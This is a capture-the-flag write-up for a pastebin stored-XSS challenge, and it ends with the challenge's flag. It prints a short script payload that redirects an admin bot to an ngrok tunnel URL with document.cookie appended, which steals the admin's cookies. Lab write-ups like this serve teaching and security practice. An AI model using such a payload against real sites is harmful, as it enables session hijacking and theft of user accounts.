# Pastebin 1 (530 solves/104 points)
## Description:

Ah, the classic pastebin. Can you get the admin's cookies?
![pastebin-1.mc.ax](http://pastebin-1.mc.ax)
![Admin bot](https://admin-bot.mc.ax/pastebin-1)

## Solution

Let's open the pastebin. It presents itself with an input box and a create paste button. Upon some examination, we can notice that the paste can execute javascript.
Now to get the admin cookies, we can get the admin into sending his cookies to a page that we own. Let's spin up a ngrok tunnel on our machine. This tunnel need not be hosting a service, because we just need to check the logs to see what page was the admin redirected to.
We can open the page in burpsuite to intercept the requests.
In the input box, this payload is entered.
```
<script>
url = "<YOUR NGROK TUNNEL URL>/"+document.cookie;
window.location.href=url;
</script>
```
Make sure the intercept is on. Burpsuite will intercept the paste ID. Let's copy the paste ID and add "http://pastebin-1.mc.ax" before the paste ID. Putting it into the admin bot, we can see the flag come up in the NGROK logs. 
## Flag:
flag{d1dn7_n33d_70_b3_1n_ru57}
